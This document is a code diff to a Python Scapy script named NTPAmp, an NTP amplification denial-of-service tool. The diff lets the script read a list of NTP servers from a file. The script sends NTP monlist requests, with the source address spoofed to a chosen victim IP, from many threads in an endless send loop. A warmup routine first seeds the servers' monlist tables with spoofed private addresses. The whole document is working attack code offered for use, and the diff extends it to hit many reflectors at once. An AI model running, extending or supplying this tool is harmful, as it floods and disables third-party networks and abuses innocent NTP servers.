@@ -7,9 +7,10 @@ import datetime
 from scapy.all import*
 
 class NTPAmp(object):
-    def __init__(self, ntpserv, victim, nthreads, sport, dport):
+    def __init__(self, fpath, victim, nthreads, sport, dport):
         # IPs
-        self.ntpserv = ntpserv
+        self.ntpservs = None
+        self.read_entries(fpath)
         self.victim = victim
 
         # Thread
@@ -26,16 +27,23 @@ class NTPAmp(object):
         ch = logging.StreamHandler()
         ch.setLevel(logging.DEBUG)
 
-        formatter = logging('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
         ch.setFormatter(formatter)
 
         self.logger.addHandler(ch)
+
+    def read_entries(self, path):
+        with open(path) as f:
+            lines = map(lambda l: l.rstrip(), f.readlines())
+            entries = map(lambda l: tuple(l.split(' ')), lines)
+            entries = map(lambda e: (e[0], int(e[1])), entries)
+            self.ntpservs = entries
 
     def add_monlist(self,srcip,sport):
         """
         Send ntp sync(ntpdate command)
         """
-        self.logger.info("[+] add monlist entry - {}:{}".format(srcip,sport))
+        self.logger.info("[*] add monlist entry - {}:{}".format(srcip,sport))
         ntpconf = {
             'leap': 3, #"unknown (clock unsynchronized)",
             'version': 4L,
@@ -48,18 +56,21 @@ class NTPAmp(object):
             'orig': 0.0,
             'sent': datetime.datetime.now().strftime("%a %b %d %H:%M:%S %Y")
         }
-        pkt=IP(src=srcip, dst=self.ntpserv)/UDP(sport=sport,dport=self.dport)/NTP(**ntpconf)
-        send(pkt)
+        for ip, dport in self.ntpservs:
+            self.logger.info("  [*] Add entry to ntpserver {}:{}".format(ip, dport))
+            pkt=IP(src=srcip, dst=ip)/UDP(sport=sport,dport=dport)/NTP(**ntpconf)
+            send(pkt)
 
     def get_monlist(self):
         """
         ntpdc -c monlist
         :return:
         """
-        self.logger.info("[+] NTP Amp Attack start!")
         data = "\x17\x00\x03\x2a" + "\x00" * 4
-        pkt=IP(dst=self.ntpserv,src=self.victim)/UDP(sport=self.sport,dport=self.dport)/Raw(load=data)
-        send(pkt,loop=1)
+        for ip, dport in self.ntpservs:
+            self.logger.info("[*] Get entry from ntpserver {}:{}".format(ip, dport))
+            pkt=IP(dst=ip,src=self.victim)/UDP(sport=self.sport,dport=dport)/Raw(load=data)
+            send(pkt,loop=1)
 
     def warmup(self):
         """
@@ -67,10 +78,9 @@ class NTPAmp(object):
         :return:
         """
         self.logger.info("[+] Warm up start!")
-        target="192.168.{}.{}"
-        for r in range(178, 178+3):
-            for c in range(1, 200):
-                self.add_monlist(target.format(r, c), random.randint(2000, 65535))
+        target="192.168.178.{}"
+        for r in range(2, 255):
+            self.add_monlist(target.format(r), random.randint(2000, 65535))
 
     def attack(self):
         """
@@ -78,13 +88,14 @@ class NTPAmp(object):
         call self.get_monlist
         :return:
         """
+        self.logger.info("[+] NTP Amp Attack start!")
         self.logger.info("[*] Spawning {} daemonized threads...".format(self.nthreads))
         threads=[]
         for r in range(self.nthreads):
             thread = threading.Thread(target=self.get_monlist)
             thread.daemon=True
+            self.logger.info("[*] Spawn {}".format(thread))
             thread.start()
-
             threads.append(thread)
         self.logger.info("[+] Finish spawning.")
 
@@ -94,9 +105,9 @@ class NTPAmp(object):
 def argument_parse():
     parser = argparse.ArgumentParser()
     parser.add_argument('-w', '--warmup', action='store_true', help='Execute warmup')
-    parser.add_argument('-s', '--ntpserv', type=str, help='Vulnerable NTP Server IP Address')
     parser.add_argument('-v', '--victim',  type=str, help='Victim IP Address')
     parser.add_argument('-n', '--nthreads',type=int, help='Number of threads (default 1)', default=1)
+    parser.add_argument('-f', '--fpath', type=str, help='NTP Servers entry file path (default ./ntpservs.txt)', default='./ntpservs.txt')
     parser.add_argument('--sport', type=int, help='Source port. this port is victim port. (default 8080)', default=8080)
     parser.add_argument('--dport', type=int, help='Destination port. this port is ntp service port. (default 123)', default=123)
     args = parser.parse_args()
@@ -104,7 +115,7 @@ def argument_parse():
 
 if __name__ == '__main__':
     args = argument_parse()
-    ntpamp = NTPAmp(args.ntpserv, args.victim, args.nthreads, args.sport, args.dport)
+    ntpamp = NTPAmp(args.fpath, args.victim, args.nthreads, args.sport, args.dport)
     if args.warmup:
         ntpamp.warmup()
     else:
